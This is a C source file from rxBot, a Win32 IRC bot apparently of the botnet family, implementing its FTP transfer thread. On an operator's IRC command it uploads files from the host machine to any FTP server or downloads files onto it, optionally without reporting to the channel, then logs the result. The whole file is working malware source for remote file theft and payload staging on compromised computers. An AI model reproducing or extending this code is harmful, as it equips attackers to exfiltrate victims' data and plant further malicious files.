/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_FTPTRANS
DWORD WINAPI FtpTransThread(LPVOID param)
{  
	char sendbuf[IRCLINE];

 	FTPTRANS ftptrans = *((FTPTRANS *)param);
    FTPTRANS *ftptranss = (FTPTRANS *)param;
	ftptranss->gotinfo = TRUE;
    
	HANDLE IntConn = fInternetConnect(ih, ftptrans.host, INTERNET_DEFAULT_FTP_PORT,
		ftptrans.username, ftptrans.password, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
	Sleep(1000);

	if (IntConn) {
		if (ftptrans.get) {
			if (fFtpGetFile(IntConn, ftptrans.remote, ftptrans.local, FALSE, FILE_ATTRIBUTE_NORMAL, 
				FTP_TRANSFER_TYPE_UNKNOWN | INTERNET_FLAG_RELOAD, 0))
				_snprintf(sendbuf,sizeof(sendbuf),"[FTPTRANS]: Successful download of: %s/%s to: %s.",
					ftptrans.host, ftptrans.remote, ftptrans.local);
			else
				_snprintf(sendbuf,sizeof(sendbuf),PrintError("[FTPTRANS]:"));
		} else {
			if (fFtpPutFile(IntConn, ftptrans.local, ftptrans.remote, FTP_TRANSFER_TYPE_UNKNOWN, 0))	
				_snprintf(sendbuf,sizeof(sendbuf),"[FTPTRANS]: Successful upload of: %s to: %s/%s.",
					ftptrans.local, ftptrans.host, ftptrans.remote);
			else 
				_snprintf(sendbuf,sizeof(sendbuf),PrintError("[FTPTRANS]:"));
		}
	} else
		_snprintf(sendbuf,sizeof(sendbuf),"[FTPTRANS]: Error: Failed to connect (invalid hostname or user account).");

	if (!ftptrans.silent) irc_privmsg(ftptrans.sock,ftptrans.chan,sendbuf,ftptrans.notice);
	addlog(sendbuf);
		
    fInternetCloseHandle(IntConn);
	clearthread(ftptrans.threadnum);

	ExitThread(0);
}
#endif